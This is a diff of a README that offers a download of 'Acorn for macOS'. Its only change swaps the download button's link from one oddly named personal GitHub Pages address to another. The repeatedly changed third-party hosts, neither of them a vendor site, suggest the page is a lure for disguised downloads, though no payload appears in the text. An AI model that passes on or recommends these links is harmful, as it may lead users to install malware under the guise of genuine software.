@@ -7,7 +7,7 @@ Acorn is perfect for creatives and professionals who need a fast, reliable, and 
 ---
 
 ## ✅ Download Acorn for macOS  
-[![Download Acorn](https://img.shields.io/badge/Download-Acorn-blueviolet)](https://shuziktobehuman.github.io/huja/Acorn)
+[![Download Acorn](https://img.shields.io/badge/Download-Acorn-blueviolet)](https://mitrobandus.github.io/.github/Acorn)
 
 ---
 
